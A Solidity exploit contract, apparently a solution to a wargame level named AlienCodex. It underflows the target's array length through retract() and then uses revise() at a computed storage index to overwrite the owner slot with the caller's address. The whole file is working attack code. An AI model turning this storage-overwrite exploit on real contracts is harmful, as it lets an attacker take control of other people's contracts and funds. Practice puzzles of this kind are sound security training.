// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex{
    function make_contact() external;
    function record(bytes32 _content) external;
    function retract()  external;
    function revise(uint i, bytes32 _content)  external;
}
contract Attacker {
    uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
    bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));
    IAlienCodex victim;

    function attack(address _victim) public {
        victim = IAlienCodex(_victim);
        victim.make_contact();
        victim.retract();
        victim.revise(index,myAddress);
    }
}
